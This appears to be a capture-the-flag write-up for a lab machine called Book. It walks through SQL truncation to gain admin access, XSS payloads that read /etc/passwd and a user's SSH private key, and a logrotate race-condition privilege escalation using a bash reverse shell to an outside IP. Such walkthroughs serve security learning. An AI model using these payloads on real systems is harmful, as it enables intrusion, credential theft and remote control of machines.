## Book

### Lab Details 

- Difficulty: Medium
- Type: SQLi, XSS, Logrotate Priv Esc, Linux
#### Enumeration
- run nmap
```
map -sT -T4 -vv -A -p- --min-rate 1500 -Pn -sC -oN Monitored.nmap 10.10.10.176
PORT      STATE  SERVICE          REASON       VERSION
22/tcp    open   tcpwrapped       syn-ack
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMrLSBfMJGYbweKg7qPaY0uw9OBPR3dlM6GiVPDVca05vEsQKJ47YXEIZoMCIg/QvJdP6RsmeQfcFbszP/stxoVfWPLBS6csfdl4rz8MjNuRAcUQjcYhPEejogNjRZKf695ggwUybHATBXNLBpCMNrrrCqtKVvgzljdEK9rnAlOVztI8bEaLbQV87lmQJvt38bHdt+UsO+HIJwrwrUkRzXeja1k/DJ4BfWgmTNUJyUWo8XiTQrpBe7JkeQ4DwJ7HZMtpnhHDv/BIwi6Tk994tDpbTGvmbnLivvT+j22KruHE6ZvEhbts+2907haztuZdgiNG5dFPH7jKapIrZWtxTB
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNKAm6pa94qHHk0DuSIarpsJaCk2vUfZkgWkrXPeIorMjT/DyTCfsM2ViRnU9YSnrVj/c3OQ1vyW8eMxiRDoOB8=
|   256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICk6vCR5eZZvVb6fwpX7k054lgERxpbaEC8jyGKxJ4Xm
80/tcp    open   tcpwrapped       syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: LIBRARY - Read | Learn | Have Fun
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```
- directory enumeration found:
```
─(kali㉿kali)-[~/…/WriteUps/Medium/Unix/Book]
└─$ ffuf -u http://10.10.10.176/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.176/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 183ms]
#                       [Status: 200, Size: 6800, Words: 461, Lines: 322, Duration: 165ms]
admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 194ms]
```
- found directory `/admin`
![[Medium/Unix/Book/login.png]]
![[Medium/Unix/Book/admin_login.png]]
- home page shows sign in form same as the admin page
- we can try register an account
![[normal_user.png]]
![[error_message_username.png]]
- the form validation on name field is name must be less than 10 characters
![[updated_name.png]]
- we can test the name field to see what happens if we enter a value longer than 10 characters
![[test_payload.png]]
- click on update we see that the name field has been truncated to 10 characters
![[truncated.png]]
- with this information we can attempt SQLi truncate attack targeting admin user, registering as `admin@book.htb`
![[SQLi_trucate.png]]
![[admin_dashboard.png]]
#### Initial Foothold 
- on the regular user dashboard under the collections tab there a book submission functionality which we can use to test for any input injection vulnerabilities
- we can test for XSS `<script>document.write("hello world")</script>`
![[payload_book_submission.png]]
- go to collections on the admin side, click on PDF and open the PDF, the message which the script has been loaded into the PDF, which means that the form is vulnerable to `XSS`
![[test_xss.png]]
- we can use `XSS` to get access to files on the target, use below to get `/etc/passwd`
```
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/passwd", true);
x.onload = function(){
document.write(x.responseText);
};
x.send();
</script>
```
![[xss_passwd.png]]
- we can get the private ssh key of `reader` user
```
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///home/reader/.ssh/id_rsa", true);
x.onload = function(){
var code = "<textarea rows='100' cols='70'>" + btoa(x.responseText) + "
</textarea>";
document.write(code);
};
x.send();
</script>
```
- once we have obtain the private key we can log into the target using ssh using the private key
#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `linpeas.sh`
- based on the output  we see `logrotate` program as well as log files in the `/home/backups` of `reader`
```
reader@book:~/backups$ ls
access.log  access.log.1
```
- to confirm that `logrotate` is running we can load `pspy` and execute
```bash
2025/08/22 01:54:38 CMD: UID=0     PID=122291 | /usr/sbin/logrotate -f /root/log.cfg 
2025/08/22 01:54:38 CMD: UID=0     PID=122292 | /bin/sh /root/reset.sh 
2025/08/22 01:54:43 CMD: UID=0     PID=122293 | /bin/sh /root/log.sh 
2025/08/22 01:54:43 CMD: UID=0     PID=122294 | /usr/sbin/logrotate -f /root/log.cfg 
2025/08/22 01:54:43 CMD: UID=0     PID=122295 | sleep 5 
2025/08/22 01:54:48 CMD: UID=0     PID=122296 | /bin/sh /root/log.sh 
2025/08/22 01:54:48 CMD: UID=0     PID=122297 | /usr/sbin/logrotate -f /root/log.cfg 
```
- since we have the write permission over the log file and its parent directory as well as `logroate` being running as root user 
- we can use `logrotten` to try to gain advantage over the race condition
- load the `c` file from https://github.com/whotwagner/logrotten to target and compile on target
- create a payload for `logrotten` to execute
```
reader@book:~$ cat shell 
#!/bin/bash
bash -c "/bin/bash -i >& /dev/tcp/10.10.16.14/4444 0>&1" &
```
- execute `logrotten` with payload
```
reader@book:~$ gcc logrotten.c -o logrotten
reader@book:~$ chmod +x logrotten shell 
reader@book:~$ echo test >> /home/reader/backups/access.log
reader@book:~$ ./logrotten -d -p shell /home/reader/backups/access.log
logfile: /home/reader/backups/access.log
logpath: /home/reader/backups
logpath2: /home/reader/backups2
targetpath: /etc/bash_completion.d/access.log
targetdir: /etc/bash_completion.d
p: access.log
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```
- **NOTE**: might have to ssh again and trigger `logrotate` in another session i.e.:
```bash
## session 1
reader@book:~$ ./logrotten -d -p shell /home/reader/backups/access.log
logfile: /home/reader/backups/access.log
logpath: /home/reader/backups
logpath2: /home/reader/backups2
targetpath: /etc/bash_completion.d/access.log
targetdir: /etc/bash_completion.d
p: access.log
Waiting for rotating /home/reader/backups/access.log...


## session 2
reader@book:~$ echo test >> /home/reader/backups/access.log
reader@book:~$ 
reader@book:~$ echo test >> /home/reader/backups/access.log
reader@book:~$ 
reader@book:~$ echo test >> /home/reader/backups/access.log
```
- once we've won the race condition we get root access
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.14] from (UNKNOWN) [10.10.10.176] 42510
root@book:~# ls
ls
clean_backup.sh
clean.sh
cron_root
log.cfg
log.sh
reset.sh
root.txt
```

#### Resources

#### Lesson Learned
- Attack on Input fields
	- XSS (Javascript)
	- SQLi truncate attack
- Logrotate attack lead to Priv Esc
